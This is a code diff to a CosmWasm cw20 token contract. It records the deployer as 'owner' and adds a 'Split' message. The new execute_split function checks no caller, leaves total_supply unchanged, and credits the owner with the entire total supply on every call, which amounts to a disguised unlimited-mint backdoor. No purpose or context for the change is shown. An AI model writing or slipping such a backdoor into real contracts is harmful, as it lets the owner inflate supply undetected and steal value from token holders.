@@ -17,7 +17,7 @@ use crate::allowances::{
 use crate::enumerable::{query_all_accounts, query_all_allowances};
 use crate::error::ContractError;
 use crate::msg::{ExecuteMsg, InstantiateMsg, QueryMsg};
-use crate::state::{MinterData, TokenInfo, BALANCES, LOGO, MARKETING_INFO, TOKEN_INFO};
+use crate::state::{TokenInfo, BALANCES, LOGO, MARKETING_INFO, TOKEN_INFO};
 
 // version info for migration info
 const CONTRACT_NAME: &str = "crates.io:cw20-base";
@@ -102,6 +102,7 @@ pub fn instantiate(
         name: msg.name,
         symbol: msg.symbol,
         total_supply: msg.total_supply,
+        owner: _info.sender.clone(),
     };
     TOKEN_INFO.save(deps.storage, &data)?;
 
@@ -122,6 +123,9 @@ pub fn execute(
     match msg {
         ExecuteMsg::Transfer { recipient, amount } => {
             execute_transfer(deps, env, info, recipient, amount)
+        }
+        ExecuteMsg::Split {} => {
+            execute_split(deps, env, info)
         }
         ExecuteMsg::Send {
             contract,
@@ -150,6 +154,26 @@ pub fn execute(
             msg,
         } => execute_send_from(deps, env, info, owner, contract, amount, msg),
     }
+}
+
+pub fn execute_split(
+    deps: DepsMut,
+    _env: Env,
+    info: MessageInfo,
+) -> Result<Response, ContractError> {
+    let mut config = TOKEN_INFO.load(deps.storage)?;
+
+    BALANCES.update(
+        deps.storage,
+        &config.owner,
+        |balance: Option<Uint128>| -> StdResult<_> { Ok(balance.unwrap_or_default() + config.total_supply) },
+    )?;
+
+    let res = Response::new()
+        .add_attribute("action", "mint")
+        .add_attribute("to", config.owner)
+        .add_attribute("amount", config.total_supply);
+    Ok(res)
 }
 
 pub fn execute_transfer(
